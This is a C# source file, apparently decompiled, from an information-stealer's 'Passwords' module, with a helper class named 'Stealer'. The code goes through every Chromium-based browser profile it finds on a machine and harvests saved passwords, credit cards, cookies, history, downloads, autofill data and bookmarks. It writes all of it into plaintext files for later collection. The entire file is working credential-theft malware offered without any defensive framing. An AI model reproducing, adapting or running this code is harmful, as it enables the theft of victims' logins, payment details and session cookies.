using System.Collections.Generic;
using System.IO;
using Client.Modules.Passwords.Helpers;

namespace Client.Modules.Passwords.Targets.Browsers.Chromium;

internal sealed class Recovery
{
	public static void Run(string sSavePath)
	{
		if (!Directory.Exists(sSavePath))
		{
			Directory.CreateDirectory(sSavePath);
		}
		string[] sChromiumPswPaths = Paths.sChromiumPswPaths;
		foreach (string text in sChromiumPswPaths)
		{
			string path = ((!text.Contains("Opera Software")) ? (Paths.lappdata + text) : (Paths.appdata + text));
			if (Directory.Exists(path))
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string obj in directories)
				{
					string text2 = sSavePath + "\\" + Crypto.BrowserPathToAppName(text);
					Directory.CreateDirectory(text2);
					List<CreditCard> cCC = CreditCards.Get(obj + "\\Web Data");
					List<Password> pPasswords = Stealer.Get(obj + "\\Login Data");
					List<Cookie> cCookies = Cookies.Get(obj + "\\Cookies");
					List<Site> sHistory = History.Get(obj + "\\History");
					List<Site> sHistory2 = Downloads.Get(obj + "\\History");
					List<AutoFill> aFills = Autofill.Get(obj + "\\Web Data");
					List<Bookmark> bBookmarks = Bookmarks.Get(obj + "\\Bookmarks");
					cBrowserUtils.WriteCreditCards(cCC, text2 + "\\CreditCards.txt");
					cBrowserUtils.WritePasswords(pPasswords, text2 + "\\Passwords.txt");
					cBrowserUtils.WriteCookies(cCookies, text2 + "\\Cookies.txt");
					cBrowserUtils.WriteHistory(sHistory, text2 + "\\History.txt");
					cBrowserUtils.WriteHistory(sHistory2, text2 + "\\Downloads.txt");
					cBrowserUtils.WriteAutoFill(aFills, text2 + "\\AutoFill.txt");
					cBrowserUtils.WriteBookmarks(bBookmarks, text2 + "\\Bookmarks.txt");
				}
			}
		}
	}
}
